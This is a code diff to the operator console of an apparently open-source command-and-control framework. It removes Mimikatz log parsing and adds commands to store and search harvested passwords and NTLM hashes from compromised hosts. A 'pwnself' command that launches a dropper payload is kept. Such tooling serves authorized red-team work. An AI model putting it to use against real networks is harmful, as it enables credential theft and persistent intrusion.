@@ -5,13 +5,13 @@ from Help import logopic, PRECOMMANDS, UXCOMMANDS, SHARPCOMMANDS, COMMANDS, pre_
 from DB import update_item, get_c2server_all, get_implants_all, get_tasks, get_implantdetails, new_urldetails
 from DB import get_newimplanturl, get_implantbyid, get_implants, get_history_dict, get_lastcommand
 from DB import new_commandhistory, get_c2urls, del_autorun, del_autoruns, add_autorun, get_autorun, get_newtasks_all
-from DB import drop_newtasks, get_implanttype, get_history, get_randomuri, get_hostdetails
+from DB import drop_newtasks, get_implanttype, get_history, get_randomuri, get_hostdetails, get_creds, get_creds_for_user, insert_cred
 from Colours import Colours
 from Config import PayloadsDirectory, POSHDIR
 from HTML import generate_table, graphviz
 from TabComplete import tabCompleter
 from Payloads import Payloads
-from Utils import validate_sleep_time, randomuri
+from Utils import validate_sleep_time, randomuri, parse_creds
 from PyHandler import handle_py_command
 from SharpHandler import handle_sharp_command
 from PSHandler import handle_ps_command
@@ -22,44 +22,6 @@ if os.name == 'nt':
 
 def catch_exit(signum, frame):
     sys.exit(0)
-
-
-def process_mimikatz(lines):
-    # code source https://github.com/stufus/parse-mimikatz-log/blob/master/pml.py
-    main_count = 0
-    current = {}
-    all = []
-    for line in lines.split('\n'):
-        main_count += 1
-        val = re.match(r'^\s*\*\s+Username\s+:\s+(.+)\s*$', line.strip())
-        if val is not None:
-            x = process_mimikatzout(current)
-            if x not in all:
-                if x is not None:
-                    all.append(x)
-            current = {}
-            current['Username'] = val.group(1).strip()
-            continue
-
-        val = re.match(r'^\s*\*\s+(Domain|NTLM|SHA1|Password)\s+:\s+(.+)\s*$', line.strip())
-        if val is not None:
-            if val.group(2).count(" ") < 10:
-                current[val.group(1).strip()] = val.group(2)
-
-    return all
-
-
-def process_mimikatzout(current):
-    fields = ['Domain', 'Username', 'NTLM', 'SHA1', 'Password']
-    for f in fields:
-        if f in current:
-            if current[f] == '(null)':
-                current[f] = ''
-        else:
-            current[f] = ''
-
-    if current['Username'] != '' and (current['Password'] != '' or current['NTLM'] != ''):
-        return current['Username'], current['Password'], current['NTLM']
 
 
 def createproxypayload(user, startup):
@@ -318,7 +280,7 @@ def startup(user, printhelp=""):
             cmd = command.replace("set-killdate ", "")
             cmd = cmd.replace("set-killdate", "")
             update_item("KillDate", "C2Server", cmd)
-            startup(user, "Updated KillDate (Remember to generate new payloads and get new implants): %s\r\n" % cmd)            
+            startup(user, "Updated KillDate (Remember to generate new payloads and get new implants): %s\r\n" % cmd)
         if command.startswith("set-defaultbeacon"):
             new_sleep = command.replace("set-defaultbeacon ", "")
             new_sleep = new_sleep.replace("set-defaultbeacon", "")
@@ -338,8 +300,6 @@ def startup(user, printhelp=""):
             uploads = ""
             urls = ""
             users = ""
-            creds = ""
-            hashes = ""
             for i in implants:
                 if i[3] not in hosts:
                     hosts += "%s \n" % i[3]
@@ -351,14 +311,6 @@ def startup(user, printhelp=""):
                 output = t[3].lower()
                 if hostname[2] not in users:
                     users += "%s\\%s @ %s\n" % (hostname[11], hostname[2], hostname[3])
-                if "invoke-mimikatz" in t[2] and "logonpasswords" in t[3]:
-                    allcreds = process_mimikatz(t[3])
-                    for cred in allcreds:
-                        if cred is not None:
-                            if cred[1]:
-                                creds += cred[0] + " Password: " + cred[1] + "\n"
-                            if cred[2]:
-                                hashes += cred[0] + " : NTLM:" + cred[2] + "\n"
                 if "uploading file" in command:
                     uploadedfile = command
                     uploadedfile = uploadedfile.partition("uploading file: ")[2].strip()
@@ -375,6 +327,7 @@ def startup(user, printhelp=""):
                 if "written scf file" in output:
                     implant_details = get_implantdetails(t[2])
                     uploads += "%s %s\n" % (implant_details[3], output[output.indexof(':'):])
+                creds, hashes = parse_creds(get_creds())
             startup(user, "Users Compromised: \n%s\nHosts Compromised: \n%s\nURLs: \n%s\nFiles Uploaded: \n%s\nCredentials Compromised: \n%s\nHashes Compromised: \n%s" % (users, hosts, urls, uploads, creds, hashes))
 
         if command.startswith("listmodules"):
@@ -383,8 +336,38 @@ def startup(user, printhelp=""):
                 mods += "%s\r\n" % modname
             startup(user, mods)
 
-        if command.startswith("creds"):
-            startup(user, "creds module not implemented yet")
+        if command == "creds":
+            creds, hashes = parse_creds(get_creds())
+            startup(user, "Credentials Compromised: \n%s\nHashes Compromised: \n%s" % (creds, hashes))
+
+        if command.startswith("creds ") and "-add " in command:
+            p = re.compile(r"-domain=([^\s]*)")
+            domain = re.search(p, command)
+            if domain: domain = domain.group(1)
+            p = re.compile(r"-username=([^\s]*)")
+            username = re.search(p, command)
+            if username: username = username.group(1)
+            p = re.compile(r"-password=([^\s]*)")
+            password = re.search(p, command)
+            if password: password = password.group(1)
+            p = re.compile(r"-hash=([^\s]*)")
+            hash = re.search(p, command)
+            if hash: hash = hash.group(1)
+            if not domain or not username:
+                startup(user, "Please specify a domain and username")
+            if password and hash:
+                startup(user, "Please specify a password or a hash, but not both")
+            if not password and not hash:
+                startup(user, "Please specify either a password or a hash")
+            insert_cred(domain, username, password, hash)
+            startup(user, "Credential added successfully")
+
+        if command.startswith("creds ") and "-search " in command:
+            username = command.replace("creds ", "")
+            username = username.replace("-search ", "")
+            username = username.strip()
+            creds, hashes = parse_creds(get_creds_for_user(username))
+            startup(user, "Credentials Compromised: \n%s\nHashes Compromised: \n%s" % (creds, hashes))
 
         if (command == "pwnself") or (command == "p"):
             subprocess.Popen(["python", "%s%s" % (PayloadsDirectory, "py_dropper.py")])
@@ -436,7 +419,7 @@ def startup(user, printhelp=""):
 
         commandloop(command, user)
     except Exception as e:
-        if 'unable to open database file' in e:
+        if 'unable to open database file' in str(e):
             startup(user)
         else:
             traceback.print_exc()
@@ -457,6 +440,39 @@ def runcommand(command, randomuri):
                 new_commandhistory(command)
         except Exception:
             pass
+
+        if command == "creds":
+            creds, hashes = parse_creds(get_creds())
+            startup(user, "Credentials Compromised: \n%s\nHashes Compromised: \n%s" % (creds, hashes))
+
+        if command.startswith("creds ") and "-add " in command:
+            p = re.compile(r"-domain=([^\s]*)")
+            domain = re.search(p, command)
+            if domain: domain = domain.group(1)
+            p = re.compile(r"-username=([^\s]*)")
+            username = re.search(p, command)
+            if username: username = username.group(1)
+            p = re.compile(r"-password=([^\s]*)")
+            password = re.search(p, command)
+            if password: password = password.group(1)
+            p = re.compile(r"-hash=([^\s]*)")
+            hash = re.search(p, command)
+            if hash: hash = hash.group(1)
+            if not domain or not username:
+                startup(user, "Please specify a domain and username")
+            if password and hash:
+                startup(user, "Please specify a password or a hash, but not both")
+            if not password and not hash:
+                startup(user, "Please specify either a password or a hash")
+            insert_cred(domain, username, password, hash)
+            startup(user, "Credential added successfully")
+
+        if command.startswith("creds ") and "-search " in command:
+            username = command.replace("creds ", "")
+            username = username.replace("-search ", "")
+            username = username.strip()
+            creds, hashes = parse_creds(get_creds_for_user(username))
+            startup(user, "Credentials Compromised: \n%s\nHashes Compromised: \n%s" % (creds, hashes))
 
     implant_type = get_implanttype(randomuri)
     if implant_type.startswith("Python"):
@@ -484,6 +500,8 @@ def commandloop(implant_id, user):
                 command = input("%s> " % (implant_id))
             else:
                 hostname = get_hostdetails(implant_id)
+                if not hostname:
+                    startup(user, "Unrecognised implant id or command: %s" % implant_id)
                 if hostname[15] == 'Python':
                     t.createListCompleter(UXCOMMANDS)
                     readline.set_completer_delims('\t')
@@ -537,7 +555,7 @@ def commandloop(implant_id, user):
             print("Error running against the selected implant ID, ensure you have typed the correct information")
             print(Colours.END)
             traceback.print_exc()
-            print ("Error: %s" % e)
+            print("Error: %s" % e)
             time.sleep(1)
             startup(user, user)
 
